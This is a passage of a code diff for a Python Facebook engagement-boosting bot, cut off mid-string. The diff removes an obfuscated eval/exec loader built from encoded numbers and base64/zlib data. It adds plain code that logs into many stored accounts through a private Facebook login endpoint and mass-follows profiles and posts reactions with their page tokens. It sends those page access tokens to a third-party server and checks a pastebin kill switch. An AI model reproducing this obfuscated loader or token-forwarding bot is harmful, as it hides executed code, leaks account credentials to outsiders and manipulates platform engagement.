$bqYBoC`UzDJL~XR^A{kbps=MJsoBli|!GTPs(yxm|E>f5lEnX#_1Y)Tfnqni6=i^`2JB8{oi}N+#>Xj*7#hV}`f!vG!E}Zf-Lr!?|@Kc+NtZ0=xkEf+%L<XhIWAf!_Spdd40Mq-_A4=(J781FJyIC+=?<-DHM#d1vs0c1z+Rosea5Rg2$C`fN<v3^6Px>G5{AK9~Cf!@A>>S-A|BlQ6?Ca#{<6{Xfd23aw8%u59ddkk|F!Lm7L&+y%M6W33z9;`cnYp4!<l@;~{2P`d<&z9divrcp}jw}=2)23tlOr-Jy%((V=wT^<Y5$;gy0ksxhgbNb`VZ4Cd-Oyt?5PYlffw7c8zs3qz1SWtOBW%(N5VFx%AA7^k{8Py7GZ0Lxk3&dKTx7R&twMTkPI^aP(9RD}!v2_&&^wu7m%v2u_L$C@$F)ojs<<ze>rFaK2?f93~@;_lQf>ddPCh%!K4mY1POC7IO<WTsX=De>pP~Pe?@Q5zs+f{*47LdYeH%;9-cd;YyvlRrCawED<{eJsIcE@=5lqwo?DmG+hI3F|JRN=?sCx_C)F`<j>U6OQ8bo3#DSFwh$IUX03h2?-?LaCI`1!BqVQJ1=qsbNBUt@9BAbmPYkpT9zfG02e|fg?ouVavnwCz=^Ipd~_w#ZdLf{(3N$5z!I!=dacN?b;6xY{&jPT%=!pB7>c~rl2`5%O1ork-9ivANf`2Z?z8JjQN7(Z*UZ)(u`0;dC-OBgQWd6jujHJ1q(89jB;?PXI_vMzI%oXa038BE9lYzAR@9=6YFSx9GIJK&wZTK$CNyB2Rdpe6J87vwl1K;VKYbTbtm6t`M_cNCS3l;G1cqQu+b3uCmCdo!aPm!MOTS6%t}4D84E>Zw88oiYI5u=<+Pe?ia3|c)aEK%BB=q6i9SFF3w~$DfRL<DoE12>d^w1imBeKCq!BXkHc9imkJu0MjVJV}=hi5#BNavEz^iCP_TW{{@eFbA_fi^b9cjm*QL|}1y2X4vI^}SG?kEK1PhopUvR<kGt$~-Z7pqJ^s<ME)hR6EZDfOSNorNpIgb%)ufGk-~9~x#V?~VT)Ppm176pWkqUgi~{8c(kQ_~DU%j*LAW!{EOp#|#(q{80^CO9xy^4ch}`*aOCTnt${r@}J74@7adZRUFC>*2LiJ5q@h}lFA(JB2=l4jYwfemt<ULmJ+MSK3}HkKG=_hCR79Y6?}Hu1e@-IXh+RCqgnUf231^V;Q3=A%!#MLoL&Y;(^y6y+YCpENKoY1Fl*%ll2jeuwI?;{jZa=5juJyVi}AGy@NNVffznclIOYTj_zh)L80vk#Lb8F_-yV66AvYxX`7|u$!99}|&{i3EFe@C98mfSdEL1B7uK~!Z<j=Gj*XSMnHIm#`EEW7r^ZMr6fY8{we@EefUX1$LWwl^N`?$CVn>}ghE^+~7wCMvUIL6O}PA4#qn-W^R2sp32LbGh0fNoIL%$KsOz#MVQfUgEScwrdhwzLzK;e7mi0BLUaDXpg@KQ%inwW}evJ~+H#3j0TuQefcF6jCHyd65SWc;65YrMEE5Tgw4xzDiJOv~s_DGN2sHTuega5Q%<#Q9UNHY@OzLa`W<UMAVEKVxS(6{IUvXL|C{`;T(0nO_1gEYA$4_N9}IC(8RMXU7E-hTj*O0MUj}+M=WkV8eC9ae>GkseZG(L{i?`2E&MzmuEZ`pH*I}^cNcF;%4yht)<yY!o+?1Ay*a=3%p|zP_|8O?`j<kq>bo)%<O^SXt*zR8rru=9Lq-*&Sjl+ISoWNe8h=uqSXYBPzZpuNIrR)PxGY`IH#tdLqW$p&t`*Fe%?UO*0GwSfmsp+06&_eQ2nSTTC`cf60_!C0f)I~~b(*OonDJ6YgQc&Cfz`;y$r~ZCAq1OBFW208Jw^Ov4x`4aLsa$@7<ci;B&%{;7eojks4BHtga@9;nenHlVrO4X`KnBh=zXx3By6Yv2j6A<?LR)f{c6EjC<@heO3`H6gn>Z;h}M@Fdz@?+$a_u0mKbqossdsU)tD%-$~PQ2u=R&|dpe%7X#BXtLk^_+Us^MS%9&%OsmV`=k&>ZDDk1TZDx${hLNc6FMZ!@g8Cj3seK+v1{gTZU$-&deg1h-b-qgNkQDRghbCskM3|<@(M4~zcvnoc#D}3ADd=w(se57bql~WwRbYV3<yh<`5YnEc}>Q$zl@OOsKeJQ=YL@-Dp{pnX4wn%|c_d-<xMxu<G7fx4Aw#urlB50cpl-yS{2?UH3Empc=Tm|mEbYG#~Wkx?~3T&bAj1a@YK4j6sIZ_v*O#!i4F-xysmDc-d$Vc$2DDGt!4YD`FpB$NB@p-=ytxE`&qD>Z&B$;BP$?5'''.replace('\n','')]))
+import requests
+from fbchat import Client
+from fbchat.models import *
+import ua_generator
+import re
+from concurrent.futures import ThreadPoolExecutor
+import os
+import threading
+import json
+import sys
+import time
 
-_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='600840 10052792 2475510 107811 3460338 725070 743968 2892000 2595808 1123520 4498098 4658724 9505818 3510345 255392 146490 5557929 9774387 9643374 676195 8169140 8968656 7951905 2729216 6994785 2809039 2272480 238206 8998248 10083880 1132512 1887269 9978295 4040976 199290 720029 6381240 390456 4855272 5536608 8270336 5334956 137240 1950112 813888 1000864 14176 4719645 7434130 4414928 6253299 9947928 1058600 1230358 2126544 2411955 8232000 3136064 3545955 10065990 11478610 1845676 5793228 1659528 8606412 2662784 9252354 3826789 8515228 10136529 9876386 4503170 4636636 3050030 2304864 8648920 3476588 1063810 6624464 4304298 1150491 8042410 11245620 2352544 7278969 5070780 3834960 143016 6244008 3168128 11537244 1865133 1213344 1977057 519120 3126900 1538392 2683994 3910416 125890 1943840 169376 2568608 2306112 1493210 846355 4957785 3989836 8217104 10113987 6212658 6166328 5037850 7088140 89080 2665299 9719915 11920920 8955970 163995 576706 283176 3952332 6138720 8659980 10319940 3459800 1280676 161860 51870 2435250 6931656 3196522 1527030 341905 7265895 9809455 5280688 6588183 1684008 10751112 3620735 3711935 2101440 809948 7445910 7656305 6875824 7874685 7469960 4394725 5493528 3843530 1205130 2690707 1967374 2228611 1179175 1150372 171600 701454 4804904 669900 5363840 4755408 11124985 3124634 2961893 2837437 10306240 6771644 3092793 3541328 182988 7504380 2047000 2964060 3378704 8487488 7190998 3697158 1008513 9005208 7376139 3927743 9552368 2742597 5133926 6206652 2311680 3009798 833028 10506608 3530296 4332300 1356850 2624527 2751793 2669733 2394070 3060196 9653172 845520 3047668 1129650 1732414 1747310 6141852 3553786 8646840 10742180 287180 1469024 8047488 11999933 3563346 859220 420224 1719072 288032 236160 8018628 6755070 3157506 9098557 82624 8832714 3347765 2617768 861504 1658215 5273592 2594072 661024 902160 6018871 5059712 9333546 5543478 10761204 2640896 8903453 1575480 7633185 2561625 10578968 1218540 2351744 2321307 6116045 1633408 7015763 5559960 703580 194336 3119584 275968 733760 8284032 10978086 2905647 3348153 823648 7268835 6811105 2865536 6322155 8007685 196784 7085907 1614012 2185672 1955680 2770597 3622466 1278320 2700033 3743630 6963888 713088 5437432 1507305 2370048 8338983 4488036 4277988 9789636 9784072 5294239 4570980 2052020 2932737 873420 692064 2712832 1440256 493184 2269836 5935947 2087019 3347070 9042473 2466925 1163640 715299 5119400 61600 6803360 3070472 3586505 7106652 2033070 3448770 1332254 3203700 10746064 3431176 5216964 6666840 4895988 1158993 1447466 1891930 7078112 6234472 5222771 3231394 5588080 4378418 11000396 10886880 8793728 1153926 5624706 10051328 4147000 877546 3422952 2137083 9117108 160089 559164 5589552 1199496 4719258 5596015 6874390 2490348 1775612 1560720 4793584 715768 4420870 1858864 1768731 6089081 782892 9675759 443322 3954581 1434120 5588080 7513732 9453620 9258872 2909040 2799450 94254 10129700 9949920 11461032 497182 218660 779670 2491648 2679584 494368 352064 4780650 2815914 294496 7500159 7957680 3969000 180320 2806720 695360 4723901 2923730 6454392 9958698 3237507 9151509 4419136 548540 636352 2456512 1158016 760864 1530048 1579104 2585568 430784 2442792 6334013 8462433 5897208 1869828 4518740 3117160 5861968 1116906 2769468 816450 2827072 1415232 1191040 2284736 8500463 5873256 4862550 8653986 474048 4160392 11480880 2319080 5977776 4726700 1302857 2626355 2011353 6087816 4281612 7839 8072324 1344846 941040 376416 1535392 25216 1638144 940672 908128 1618464 2692032 10648056 9403706 9440490 4338990 8526326 10022230 3095680 5052656 1556850 3580776 899200 322624 1953120 70272 295072 4593225 1466046 1091200 6202410 2524200 3669480 7108528 2021742 3980813 775188 2749880 879060 7325537 2466936 3110290 5079795 2893968 18560 2327936 929024 2551104 2492384 250208 2255232 2757472 1236384 1442994 8935815 6523840 4058288 758816 5608275 159264 4936678 7766440 635360 3872280 3241388 98154 46120 2160368 1370625 2638555 1671604 1677458 10174381 1842902 2885703 1477056 2982847 11056675 3048096 4126658 5386576 8473294 255852 9015797 5719266 523215 5380544 7602876 3131200 3952665 5033820 6584982 3005160 3080910 7898256 1513884 2341428 858130 2530240 1594784 2112896 2613536 9160801 10402320 9666407 2264229 3761800 3583302 3224816 6873656 7062880 2358440 1934464 2074850 443128 2641596 11325900 7407946 5716016 5132800 3202520 2705549 2412399 473240 41376 1962080 2383136 2582624 116230 8708018 5645880 6635178 8949913 7043904 9106580 3237618 801350 193792 558464 1907744 2121536 7285534 6910080 4454403 7914654 3865800 9856668 3906900 1701828 590760 464890';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdK8wccz1A+IwYyBt6OheketYHmYKAFuyB3k=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
-                
+try:
+	a = requests.get('https://pastebin.com/raw/x78mm18D').json()
+	if a['RESTRICT'].upper() != "TRUE":
+		try:
+			with open('configuration.json') as f:
+				configuration = json.load(f)
+		except FileNotFoundError:
+			print("\033[1m\033[91mSORRY, AN ERROR ENCOUNTERED WHILE FINDING 'CONFIGURATION.JSON'.\033[0m")
+			sys.exit()
+		except json.decoder.JSONDecodeError:
+			print("\033[1m\033[91mSORRY, AN ERROR ENCOUNTERED WHILE READING THE JSON FILE.\033[0m")
+			sys.exit()
+	else:
+		print_slow("""\033[1m\033[91mLOCK MODE IS ACTIVATED!
+		
+WHAT IS LOCK MODE?
+LOCK MODE IS HAPPENED WHEN THE AUTHOR OF THIS SCRIPT DECIDED TO TURN ON THE RESTRICTION OF THIS SCRIPT FOR SOME REASON.
+		 
+AUTHOR MESSAGE:
+{}
+		\033[0m""".format(a['MESSAGE']))
+		sys.exit()
+except requests.exceptions.ConnectionError:
+	print("\033[1m\033[91mPLEASE CHECK YOUR INTERNET CONNECTION AND TRY AGAIN.\033[0m")
+	sys.exit()
+
+def print_slow(str):
+            for char in str:
+            	time.sleep(.1)
+            	sys.stdout.write(char)
+            	sys.stdout.flush()
+            sys.exit()
+
+
+class MessBot(Client):
+    add_token = []
+
+    def get_token(self):
+        global configuration
+        os.system('clear')
+        accounts = configuration['CONFIG']['PAGE_ACCOUNTS']['ACCOUNTS']
+        for account in accounts:
+            account_data = account.split('|')
+            url = 'https://b-api.facebook.com/method/auth.login'
+            form = {
+                'adid': 'e3a395f9-84b6-44f6-a0ce-fe83e934fd4d',
+                'email': account_data[0],
+                'password': account_data[1],
+                'format': 'json',
+                'device_id': '67f431b8-640b-4f73-a077-acc5d3125b21',
+                'cpl': 'true',
+                'family_device_id': '67f431b8-640b-4f73-a077-acc5d3125b21',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'credentials_type': 'device_based_login_password',
+                'generate_session_cookies': '1',
+                'generate_analytics_claim': '1',
+                'generate_machine_id': '1',
+                'currently_logged_in_userid': '0',
+                'irisSeqID': 1,
+                'try_num': '1',
+                'enroll_misauth': 'false',
+                'meta_inf_fbmeta': 'NO_FILE',
+                'source': 'login',
+                'machine_id': 'KBz5fEj0GAvVAhtufg3nMDYG',
+                'meta_inf_fbmeta': '',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d',
+                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32'
+            }
+            headers = {
+                'content-type': 'application/x-www-form-urlencoded',
+                'x-fb-friendly-name': 'fb_api_req_friendly_name',
+                'x-fb-http-engine': 'Liger',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
+            }
+            response = requests.post(url, data=form, headers=headers)
+            try:
+                response_data = response.json()
+                if 'access_token' in response_data:
+                    self.add_token.append(response_data['access_token'])
+                    print("\033[1m[\033[91m\033[1m/\033[0m\033[1m] PAGES SUCCESSFULLY LOADED!\033[0m")
+                else:
+                    print("\033[1m[\033[91m\033[1mx\033[0m\033[1m] PAGES FAILED TO LOAD!\033[0m")
+            except ValueError as e:
+                print("\033[1m[\033[91m\033[1mx\033[0m\033[1m] Error decoding JSON for {} {}: {}\033[0m".format(
+                    account_data[0], account_data[1], e))
+
+    def react(self, post_id, reaction_type):
+        for access_token in self.add_token:
+            try:
+                response = requests.get(
+                    f'https://graph.facebook.com/me/accounts?access_token={access_token}').json()
+
+                for page in response.get('data', []):
+                    page_access_token = page.get('access_token', '')
+                    page_name = page.get('name', '')
+
+                    try:
+                        headers = {
+                            'content-type': 'application/x-www-form-urlencoded',
+                            'x-fb-friendly-name': 'fb_api_req_friendly_name',
+                            'x-fb-http-engine': 'Liger',
+                            'user-agent': str(ua_generator.generate())
+                        }
+                        response = requests.get(f'https://mahirochan.pythonanywhere.com/api', params={'reaction_type': reaction_type.upper(), 'link': post_id, 'access_token': page_access_token}, headers=headers)
+                        if response.status_code == 200:
+                            print("\033[0m\033[1m[\033[91mSUCCESS\033[0m\033[1m] SUCCESSFULLY REACTION |\033[91m {}\033[0m \033[1m|\033[90m {}\033[0m".format(
+                                page_name, str(response.json())))
+                        else:
+                            print("\033[1;91m[ERROR]\033[0;1m FAILED TO POST REACTION \033[0m")
+                            pass
+                    except requests.exceptions.RequestException as error:
+                        print("\033[1;91m[EXCEPTION]\033[0;1m {}\033[0m".format(error))
+            except requests.exceptions.RequestException as error:
+                print("\033[1;91m[EXCEPTION]\033[0m {}".format(error))
+
+    def follow(self, account_id):
+        for token in self.add_token:
+            success_followed = False
+            headers = {'Authorization': f'Bearer {token}'}
+
+            scope = [
+                'public_profile', 'email', 'user_friends', 'user_likes', 'user_photos',
+                'user_videos', 'user_status', 'user_posts', 'user_tagged_places', 'user_hometown',
+                'user_location', 'user_work_history', 'user_education_history', 'user_groups',
+                'publish_pages', 'manage_pages'
+            ]
+            data = {'scope': ','.join(scope)}
+
+            response = requests.get(
+                'https://graph.facebook.com/v18.0/me/accounts', headers=headers, params=data)
+            pages_data = response.json().get('data', [])
+
+            for page in pages_data:
+                page_access_token = page.get('access_token', '')
+                page_name = page.get('name', '')
+
+                try:
+                    response = requests.post(
+                        f'https://graph.facebook.com/v18.0/{account_id}/subscribers', headers={'Authorization': f'Bearer {page_access_token}'})
+                    print("\033[0m\033[1m[\033[91mSUCCESS\033[0m\033[1m] SUCCESSFULLY FOLLOW |\033[91m {}\033[0m \033[1m|\033[91m {}\033[0m \033[1m|\033[91m {}\033[0m".format(
+                        page_name, account_id, response))
+                    success_followed = True
+                except requests.exceptions.RequestException as error:
+                    print(error)
+
+    def sendmessage(self, author_id, thread_id, thread_type, reply):
+        if author_id != self.uid:
+            self.send(Message(text=reply),
+                      thread_id=thread_id,
+                      thread_type=thread_type)
+
+    def onMessage(self, mid=None, author_id=None, message_object=None, thread_id=None, thread_type=ThreadType.USER, **kwargs):
+        try:
+            global follow_in_progress, reaction_in_progress
+            with open('configuration.json') as f:
+            	configuration = json.load(f)
+            msg = message_object.text.lower()
+            rainbow_light_text_print("[ [ MESSAGE ] ] " + msg)
+            prefix = str(configuration['CONFIG']['BOT_INFO']['PREFIX'])
+            prefixs = ("prefix", "PREFIX", "Mahiro", "MAHIRO", "Prefix")
+            if any(msg.startswith(prefix) for prefix in prefixs):
+            	reply = f"𝙷𝙾𝚆 𝚃𝙾 𝚄𝚂𝙴:\n- {prefix}𝚏𝚋𝚏𝚘𝚕𝚕𝚘𝚠 [𝚒𝚍]\n- {prefix}𝚏𝚋𝚛𝚎𝚊𝚌𝚝 [𝙻𝙸𝙺𝙴/𝙻𝙾𝚅𝙴/𝚂𝙰𝙳/𝙰𝙽𝙶𝚁𝚈/𝙷𝙰𝙷𝙰] [𝚕𝚒𝚗𝚔]\n\n𝙼𝚊𝚔𝚎 𝚜𝚞𝚛𝚎 𝚝𝚑𝚊𝚝 𝚝𝚑𝚎 𝚕𝚒𝚗𝚔 𝚢𝚘𝚞'𝚛𝚎 𝚞𝚜𝚒𝚗𝚐 𝚒𝚜 𝚏𝚛𝚘𝚖 𝚏𝚋𝚕𝚒𝚝𝚎 𝚘𝚛 𝚎𝚕𝚜𝚎 𝚒𝚝 𝚖𝚒𝚐𝚑𝚝 𝚗𝚘𝚝 𝚠𝚘𝚛𝚔.\n\n𝚃𝚢𝚙𝚎 '{prefix}𝚕𝚒𝚜𝚝' 𝚝𝚘 𝚜𝚑𝚘𝚠 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚌𝚘𝚖𝚖𝚊𝚗𝚍𝚜."
+            	self.sendmessage(author_id, thread_id, thread_type, reply)
+            dev = ("dev", "owner", "Owner", "Developer", "developer", "OWNER", "DEVELOPER", "DEV")
+            if any(msg.startswith(word) for word in dev):
+                reply = "𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁: 𝙼𝙰𝙷𝙸𝚁𝙾 𝙲𝙷𝙰𝙽"
+                self.sendmessage(author_id, thread_id, thread_type, reply)
+            greetings = ("hi", "Hi", "hello", "Hello", "hi!", "Hi!", "hello!", "Hello!")
+            if any(msg.startswith(greeting) for greeting in greetings):
+                sender_name = self.fetchUserInfo(author_id)[author_id].name
+                reply = f"Hello, {sender_name}!"
+                self.sendmessage(author_id, thread_id, thread_type, reply)
+            if msg.startswith(f"{prefix}fbfollow"):
+                if follow_in_progress:
+                    reply = "⌛𝚃𝚑𝚎 𝚜𝚕𝚘𝚝 𝚒𝚜 𝚌𝚞𝚛𝚛𝚎𝚗𝚝𝚕𝚢 𝚘𝚌𝚌𝚞𝚙𝚒𝚎𝚍; 𝚠𝚎 𝚊𝚕𝚕𝚘𝚠 𝚘𝚗𝚕𝚢 𝚘𝚗𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚊𝚝 𝚊 𝚝𝚒𝚖𝚎. 𝙿𝚕𝚎𝚊𝚜𝚎 𝚛𝚎𝚝𝚛𝚢 𝚊𝚏𝚝𝚎𝚛 𝚊 𝚏𝚎𝚠 𝚖𝚒𝚗𝚞𝚝𝚎𝚜."
+                    self.sendmessage(author_id, thread_id, thread_type, reply)
+                else:
+                    follow_in_progress = True
+                    id = msg[len(prefix)+9:]
+                    allow = ['100', '615']
+
+                    if "https://www.facebook.com/" in id or "https://m.facebook.com/story.php" in id or not any(id.startswith(allowed) for allowed in allow):
+                        reply = "❌ 𝙸𝙳 𝙽𝙾𝚃 𝙵𝙾𝚄𝙽𝙳!"
+                        self.sendmessage(author_id, thread_id, thread_type, reply)
+                        follow_in_progress = False
+                    else:
+                        reply = "⌛𝙿𝚁𝙾𝙲𝙴𝚂𝚂𝙸𝙽𝙶 𝙿𝚄𝚁𝙲𝙷𝙰𝚂𝙴, 𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃.."
+                        self.sendmessage(author_id, thread_id, thread_type, reply)
+
+                        def f():
+                            try:
+                                self.get_token()
+                                self.follow(id)
+                            except Exception as e:
+                                return str(e)
+                            finally:
+                                global follow_in_progress
+                                follow_in_progress = False
+                                reply = "🗒𝙾𝚁𝙳𝙴𝚁 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝚁𝚁𝙸𝚅𝙴𝙳."
+                                self.sendmessage(author_id, thread_id, thread_type, reply)
+
+                        success_followed = threading.Thread(target=f)
+                        success_followed.start()
+
+                        if success_followed:
+                            reply = f"[ 𝙿𝚄𝙲𝙷𝙰𝚂𝙴 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝚂𝙴𝙽𝚃 ]\n🔗𝙿𝚁𝙾𝙵𝙸𝙻𝙴 𝙻𝙸𝙽𝙺: https://www.facebook.com/{id}\n💢𝙼𝙴𝚃𝙷𝙾𝙳 𝚂𝙴𝚁𝚅𝙸𝙲𝙴: 𝙵𝙱𝙵𝙾𝙻𝙻𝙾𝚆\n🏆𝙿𝚁𝙴𝙼𝙸𝚄𝙼: 𝙽𝙾(𝙵𝚁𝙴𝙴)\n\n[+] ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ ᴍᴀʜɪʀᴏ ᴄʜᴀɴ"
+                            self.sendmessage(author_id, thread_id, thread_type, reply)
+                        else:
+                            reply = "❌𝙵𝙰𝙸𝙻𝙴𝙳 𝙿𝚄𝚁𝙲𝙷𝙰𝚂𝙴 𝚁𝙴𝚀𝚄𝙴𝚂𝚃."
+                            self.sendmessage(author_id, thread_id, thread_type, reply)
+            if msg.startswith(f"{prefix}fbreact"):
+                if reaction_in_progress:
+                    reply = "⌛𝚃𝚑𝚎 𝚜𝚕𝚘𝚝 𝚒𝚜 𝚌𝚞𝚛𝚛𝚎𝚗𝚝𝚕𝚢 𝚘𝚌𝚌𝚞𝚙𝚒𝚎𝚍; 𝚠𝚎 𝚊𝚕𝚕𝚘𝚠 𝚘𝚗𝚕𝚢 𝚘𝚗𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚊𝚝 𝚊 𝚝𝚒𝚖𝚎. 𝙿𝚕𝚎𝚊𝚜𝚎 𝚛𝚎𝚝𝚛𝚢 𝚊𝚏𝚝𝚎𝚛 𝚊 𝚏𝚎𝚠 𝚖𝚒𝚗𝚞𝚝𝚎𝚜."
+                    self.sendmessage(author_id, thread_id, thread_type, reply)
+                else:
+                    reaction_in_progress = True
+                    id_and_link = msg[len(prefix)+8:].split(" ")
+                    if len(id_and_link) < 2:
+                        reply = "❌𝚆𝚁𝙾𝙽𝙶 𝙵𝙾𝚁𝙼𝙰𝚃!"
+                        self.sendmessage(author_id, thread_id, thread_type, reply)
+                        reaction_in_progress = False
+                    else:
+                        reaction_in_progress = True
+                        me = msg[len(prefix)+8:].split(" ")
+                        id = me[0].upper()
+                        link = me[1]
+                        if id not in ['LIKE', 'LOVE', 'WOW', 'HAHA', 'SAD', 'ANGRY'] or "https://www.facebook.com/" not in link:
+                            reply = "❌𝚆𝚁𝙾𝙽𝙶 𝚁𝙴𝙰𝙲𝚃𝙸𝙾𝙽 𝚃𝚈𝙿𝙴 𝙾𝚁 𝚆𝚁𝙾𝙽𝙶 𝚄𝚁𝙻"
+                            self.sendmessage(author_id, thread_id, thread_type, reply)
+                            reaction_in_progress = False
+                        else:
+                            reply = "⌛𝙿𝚁𝙾𝙲𝙴𝚂𝚂𝙸𝙽𝙶 𝙿𝚄𝚁𝙲𝙷𝙰𝚂𝙴, 𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃.."
+                            self.sendmessage(author_id, thread_id, thread_type, reply)
+
+                            def r():
+                                try:
+                                    self.get_token()
+                                    self.react(link, id)
+                                except Exception as e:
+                                    return str(e)
+                                finally:
+                                	global reaction_in_progress
+                                	reaction_in_progress = False
+                                	reply = "🗒𝙾𝚁𝙳𝙴𝚁 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝚁𝚁𝙸𝚅𝙴𝙳."
+                                	self.sendmessage(author_id, thread_id, thread_type, reply)
+
+                            success_reaction = threading.Thread(target=r)
+                            success_reaction.start()
+                            if success_reaction:
+                                    reply = f"[ 𝙿𝚄𝙲𝙷𝙰𝚂𝙴 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝚂𝙴𝙽𝚃 ]\n🔗𝙿𝚁𝙾𝙵𝙸𝙻𝙴 𝙻𝙸𝙽𝙺: {link}\n💢𝙼𝙴𝚃𝙷𝙾𝙳 𝚂𝙴𝚁𝚅𝙸𝙲𝙴: 𝙵𝙱𝚁𝙴𝙰𝙲𝚃𝙸𝙾𝙽\n🏆𝙿𝚁𝙴𝙼𝙸𝚄𝙼: 𝙽𝙾(𝙵𝚁𝙴𝙴)\n\n[+] ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ ᴍᴀʜɪʀᴏ ᴄʜᴀɴ"
+                                    self.sendmessage(author_id, thread_id, thread_type, reply)
+                            else:
+                                    reply = "❌𝙵𝙰𝙸𝙻𝙴𝙳 𝙿𝚄𝚁𝙲𝙷𝙰𝚂𝙴 𝚁𝙴𝚀𝚄𝙴𝚂𝚃."
+                                    self.sendmessage(author_id, thread_id, thread_type, reply)
+            if msg.startswith(f"{prefix}setprefix"):
+            	if author_id in configuration['CONFIG']['BOT_INFO']['ADMIN_ID']:
+            		new = msg[len(prefix)+10:]
+            		if new == "" or " " in new or len(new) != 1:
+            			reply = "❌𝙿𝚁𝙴𝙵𝙸𝚇 𝙼𝚄𝚂𝚃 𝙷𝙰𝚅𝙴 𝚅𝙰𝙻𝚄𝙴 𝙰𝙽𝙳 𝙳𝙾𝙴𝚂𝙽'𝚃 𝙷𝙰𝚅𝙴 𝚂𝙿𝙰𝙲𝙴 𝙰𝙽𝙳 𝙾𝙽𝙻𝚈 𝙾𝙽𝙴 𝚂𝚈𝙼𝙱𝙾𝙻/𝙻𝙴𝚃𝚃𝙴𝚁."
+            			self.sendmessage(author_id, thread_id, thread_type, reply)
+            		else:
+            			with open("configuration.json", "r") as jsonFile:
+            				data = json.load(jsonFile)
+            			data['CONFIG']['BOT_INFO']['PREFIX'] = str(new)
+            			with open("configuration.json", "w") as jsonFile:
+            				json.dump(data, jsonFile, indent=3)
+            			reply = f"✅𝙿𝚁𝙴𝙵𝙸𝚇 𝚆𝙰𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙲𝙷𝙰𝙽𝙶𝙴𝙳.\n𝙽𝙴𝚆 𝙿𝚁𝙴𝙵𝙸𝚇: {new}" 
+            			self.sendmessage(author_id, thread_id, thread_type, reply)
+            	else:
+            		reply = "❌𝙾𝙽𝙻𝚈 𝙰𝙳𝙼𝙸𝙽 𝙲𝙰𝙽 𝙰𝙲𝙲𝙴𝚂𝚂 𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳."
+            		self.sendmessage(author_id, thread_id, thread_type, reply)
+            if msg.startswith(f"{prefix}catfact"):
+            	facts = requests.get('https://catfact.ninja/fact').json()['fact']
+            	reply = f"𝙲𝙰𝚃𝙵𝙰𝙲𝚃 𝚁𝙴𝚂𝙿𝙾𝙽𝙳: \n{facts}"
+            	self.sendmessage(author_id, thread_id, thread_type, reply)
+            if msg.startswith(f"{prefix}list"):
+                reply = f"""[ 𝙁𝘽 𝘽𝙊𝙊𝙎𝙏𝙄𝙉𝙂 𝘽𝙊𝙏 ]
